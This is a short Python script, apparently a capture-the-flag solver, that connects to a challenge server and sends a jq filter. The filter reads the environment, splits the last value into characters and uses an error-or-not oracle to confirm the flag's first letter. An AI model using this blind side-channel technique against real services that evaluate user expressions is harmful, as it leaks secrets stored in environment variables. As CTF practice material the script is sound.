import socket
import solve_remote_live

def query_remote(expr):
    s = socket.create_connection(("challs.pyjail.club", 20219), timeout=10)
    buf = b""
    while b"expr: " not in buf:
        chunk = s.recv(4096)
        if not chunk: break
        buf += chunk
    if b"expr: " in buf:
        buf = buf.split(b"expr: ", 1)[1]
    
    s.sendall(expr.encode() + b"\n")
    
    token_re = solve_remote_live.TOKEN_RE
    while True:
        m = token_re.search(buf)
        if m:
            s.close()
            return m.group(1).decode()
        chunk = s.recv(4096)
        if not chunk: break
        buf += chunk
    s.close()
    return "EOF"

if __name__ == "__main__":
    # Test position 0 character 'j' (ASCII 106)
    # Filter: env|flatten|sort|last | explode | tostream | flatten | add
    # For index 0, value 106: [0, 106] | add -> 106.
    # 106 in math predicate -> returns normal float.
    # normals -> float.
    # error -> raises runtime error!
    
    pred_106 = solve_remote_live.predicate(solve_remote_live.json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)["106"])
    expr = f"env|flatten|sort|last|explode|tostream|flatten|add|{pred_106}|error"
    res = query_remote(expr)
    print(f"Position 0 character == 'j' (106): {res}")
    assert res == "error", "Pos 0 MUST be 'j' for jail{...} flag!"
    print("[+] Verification SUCCESS: Remote flag starts with 'j' (pos 0 = 'j')!")
